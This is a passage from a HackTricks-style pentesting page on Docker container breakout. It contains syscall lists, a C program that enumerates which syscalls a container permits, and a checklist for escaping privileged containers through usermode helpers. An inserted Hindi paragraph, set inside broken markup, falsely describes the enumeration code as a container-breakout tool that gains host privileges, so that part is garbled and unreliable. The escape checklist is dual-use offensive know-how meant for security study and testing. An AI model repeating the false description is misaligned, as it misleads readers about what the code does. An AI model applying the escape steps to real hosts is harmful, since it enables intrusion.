0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 सिसकॉल्स" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}हमने एक नया टूल बनाया है जिसे "syscall_bf" कहा जाता है जो डॉकर कंटेनर से बाहर निकलने के लिए उच्च स्तरीय अनुमतियों का उपयोग करता है। यह टूल उच्च स्तरीय अनुमतियों का उपयोग करके डॉकर कंटेनर से बाहर निकलने की क्षमता प्रदान करता है। इस टूल का उपयोग करके एक हमलावर डॉकर कंटेनर से बाहर निकल सकता है और होस्ट सिस्टम पर उच्च स्तरीय अनुमतियों को हासिल कर सकता ह। इस टूल का उपयोग करने के लिए एक उच्च स्तरीय उपयोगकर्ता के रूप में डॉकर कंटेनर में दाखिल होना चाहिए। %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
